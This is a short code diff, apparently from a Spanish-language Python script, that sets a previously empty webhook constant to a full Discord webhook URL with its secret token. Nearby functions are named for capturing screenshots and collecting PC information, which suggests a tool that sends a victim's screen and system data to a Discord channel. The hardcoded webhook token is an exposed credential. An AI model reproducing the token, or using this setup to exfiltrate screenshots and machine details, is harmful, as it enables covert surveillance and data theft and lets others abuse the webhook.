@@ -260,7 +260,7 @@ def capturar_pantalla_jpg():
 
 ######## Webhook #############################################################
 
-WEBHOOK_URL_UNICO = ""
+WEBHOOK_URL_UNICO = "https://discord.com/api/webhooks/1560604217654386858/RcEuKQFGc-pguKLBFfaUmepTYVNlPlF0yzr1o-UAF-goZL7JCdt9Ifbi3lr-c_npaC3e"
 
 
 def obtener_info_pc():
